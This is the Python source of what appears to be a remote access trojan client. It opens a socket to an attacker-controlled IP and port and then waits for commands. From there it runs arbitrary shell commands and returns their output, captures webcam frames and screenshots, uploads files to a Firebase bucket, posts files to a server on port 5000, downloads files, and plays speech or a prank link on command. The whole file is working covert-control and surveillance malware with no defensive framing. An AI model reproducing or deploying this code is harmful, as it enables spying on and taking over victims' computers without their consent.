import socket
import subprocess
import time
import cv2
import requests
import pyrebase
import pyautogui
import pyttsx3
from dotenv import load_dotenv
import os

load_dotenv()

sock=socket.socket()
engine = pyttsx3.init()

ip=os.getenv('IP')

sock.connect((ip,int(os.getenv('PORT'))))

config={
  "apiKey": os.getenv('API_KEY'),
  "authDomain": os.getenv('AUTH_DOMAIN='),
  "databaseURL": os.getenv('DATABASE_URL'),
  "projectId": os.getenv('PROJECT_ID'),
  "storageBucket":os.getenv('STORAGE_BUCKET'),
  "serviceAccount":os.getenv('SERVICE_KEY_PATH')
   }

firebase=pyrebase.initialize_app(config)

def say(a):
    engine.say(a)
    engine.runAndWait()
    send("d0ne")


def upload(local_path,cloud_path,firebase=firebase):
  storage=firebase.storage()
  try:
    storage.child(cloud_path).put(local_path)
    send("d0ne")
  except:
    pass
  return


def download(cloud_path,fname,firebase=firebase):
  storage=firebase.storage()
  try:
    storage.download(cloud_path,fname)
    send("d0ne")
  except:
    pass
  return


def screen_capture():
    runtime = pyautogui.screenshot()
    runtime.save("screen.png")
    upload("screen.png","screen-{}.png".format(time.strftime("%Y%m%d-%H%M%S")))
    return

def send(a):
    i=0
    j=4028
    size=len(a)
    while True:
        sock.sendall(a[i:j+1].encode())
        i=j+1
        j=j+j
        a=a[i:j+1]
        if len(a)==0:
            break

    sock.send("d0ne".encode())
    return

def run_command(a):
    process = subprocess.Popen(a, stdout=subprocess.PIPE,shell=True)
    output = process.stdout.read()
    send(output.decode())
    return

def send_file(a="output.jpg"):
    if a!="output.jpg":
            requests.post("http://{}:5000/output".format(ip),data="output.{}".format(a[-3:]),files=open(a,"rb"))
            send("capture saved")
    else:
        requests.post("http://{}:5000/output".format(ip),data={"filename":"output.jpg"},files={"files":open(a,"rb")})
        send("capture saved")


def capture_webcam():
    cap=cv2.VideoCapture(0)


    while True:
        _,frame=cap.read()
        if _:
            cv2.imwrite("output.jpg",frame)
            upload("output.jpg","output-{}.jpg".format(time.strftime("%Y%m%d-%H%M%S")))

            break


while True:
    data=sock.recv(1024).decode().strip()

    try:
        if "run" in data.split():
            run_command(data.split(maxsplit=1)[1].strip())
        elif data=="capture":
            capture_webcam()
        elif data=="screen capture":
            screen_capture()
        elif data.split(maxsplit=1)[0].strip()=="upload":
            file=data.split(maxsplit=1)[1].strip()
            upload(file,file.split("/")[-1])
        elif data.split(maxsplit=1)[0].strip()=="download":
            download(data.split(maxsplit=1)[1].strip(),data.split(maxsplit=1)[1].strip())
        elif data.split(maxsplit=1)[0].strip()=="say":
            say(data.split(maxsplit=1)[1].strip())
        elif data=="b*tch":
            run_command("start https://www.youtube.com/watch?v=iik25wqIuFo")
        else:
            send("d0ne")
    except:
        send('Failed')